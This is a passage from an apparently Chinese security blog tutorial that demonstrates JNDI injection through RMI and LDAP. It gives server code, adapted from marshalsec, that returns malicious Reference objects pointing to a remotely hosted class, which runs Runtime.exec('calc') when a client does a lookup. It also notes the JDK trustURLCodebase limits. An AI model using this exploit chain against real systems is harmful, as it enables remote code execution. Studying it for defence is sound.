    import javax.naming.Reference;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class server {
        public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
            String url = "http://127.0.0.1:8080/";
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference reference = new Reference("test", "test", url);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("obj",referenceWrapper);
            System.out.println("running");
        }
    }
####  RMIClient代码：
    package com.rmi.jndi;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    public class client {
        public static void main(String[] args) throws NamingException {
            String url = "rmi://localhost:1099/obj";
            InitialContext initialContext = new InitialContext();
            initialContext.lookup(url);
        }
    }
下面还需要一段执行命令的代码，挂载在web页面上让server端去请求。
    package com.rmi.jndi;
    import java.io.IOException;
    public class test {
        public static void main(String[] args) throws IOException {
            Runtime.getRuntime().exec("calc");
        }
    }
使用javac命令，将该类编译成class文件挂载在web页面上。
原理其实就是把恶意的`Reference`类，绑定在RMI的Registry
里面，在客户端调用`lookup`远程获取远程类的时候，就会获取到`Reference`对象，获取到`Reference`对象后，会去寻找`Reference`中指定的类，如果查找不到则会在`Reference`中指定的远程地址去进行请求，请求到远程的类后会在本地进行执行。
我在这里其实是执行失败了，因为在高版本中，系统属性
`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`
的默认值变为false。而在低版本中这几个选项默认为true，可以远程加载一些类。
###  LDAP概念
轻型目录访问协议（英文：Lightweight Directory Access
Protocol，缩写：LDAP，/ˈɛldæp/）是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。
###  JNDI注入+LDAP实现攻击
有了前面的案例后，再来看这个其实也比较简单，之所以JNDI注入会配合LDAP是因为LDAP服务的Reference远程加载Factory类不受`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`等属性的限制。
启动一个ldap服务，该代码由某大佬改自marshalsec。
    package com.rmi.rmiclient;
    import java.net.InetAddress;
    import java.net.MalformedURLException;
    import java.net.URL;
    import javax.net.ServerSocketFactory;
    import javax.net.SocketFactory;
    import javax.net.ssl.SSLSocketFactory;
    import com.unboundid.ldap.listener.InMemoryDirectoryServer;
    import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
    import com.unboundid.ldap.listener.InMemoryListenerConfig;
    import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
    import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
    import com.unboundid.ldap.sdk.Entry;
    import com.unboundid.ldap.sdk.LDAPException;
    import com.unboundid.ldap.sdk.LDAPResult;
    import com.unboundid.ldap.sdk.ResultCode;
    public class demo {
        private static final String LDAP_BASE = "dc=example,dc=com";
        public static void main ( String[] tmp_args ) {
            String[] args=new String[]{"http://127.0.0.1:8080/#test"};
            int port = 7777;
            try {
                InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
                config.setListenerConfigs(new InMemoryListenerConfig(
                        "listen", //$NON-NLS-1$
                        InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                        port,
                        ServerSocketFactory.getDefault(),
                        SocketFactory.getDefault(),
                        (SSLSocketFactory) SSLSocketFactory.getDefault()));
                config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
                InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
                System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
                ds.startListening();
            }
            catch ( Exception e ) {
                e.printStackTrace();
            }
        }
        private static class OperationInterceptor extends InMemoryOperationInterceptor {
            private URL codebase;
            public OperationInterceptor ( URL cb ) {
                this.codebase = cb;
            }
            @Override
            public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
                String base = result.getRequest().getBaseDN();
                Entry e = new Entry(base);
                try {
                    sendResult(result, base, e);
                }
                catch ( Exception e1 ) {
                    e1.printStackTrace();
                }
            }
            protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
                URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
                System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
                e.addAttribute("javaClassName", "foo");
                String cbstring = this.codebase.toString();
                int refPos = cbstring.indexOf('#');
                if ( refPos > 0 ) {
                    cbstring = cbstring.substring(0, refPos);
                }
                e.addAttribute("javaCodeBase", cbstring);
                e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
                e.addAttribute("javaFactory", this.codebase.getRef());
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }
        }
    }
编写一个client客户端。
    package com.rmi.rmiclient;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    public class clientdemo {
        public static void main(String[] args) throws NamingException {
            Object object=new InitialContext().lookup("ldap://127.0.0.1:7777/calc");
    }}
编写一个远程恶意类，并将其编译成class文件，放置web页面中。
    public class test{
        public test() throws Exception{
            Runtime.getRuntime().exec("calc");
        }
    }
这里有个坑点，就是恶意的类，不能包含最上面的package信息，否则会调用失败。下面来启动一下服务器端，然后启动客户端。
在 JDK 8u191
`com.sun.jndi.ldap.object.trustURLCodebase`属性的默认值被调整为false。这样的方式没法进行利用，但是还是会有绕过方式。在这里不做赘述。
###  参考文章
    https://xz.aliyun.com/t/8214
    https://xz.aliyun.com/t/6633
    https://xz.aliyun.com/t/7264
在此感谢师傅们的文章，粗略的列了几个师傅的文章，但不仅限于这些。文中有一些错误的地方，望师傅们指出。
## 0x04 结尾
其实在这篇文中前前后后也是花费了不少时间，各种坑。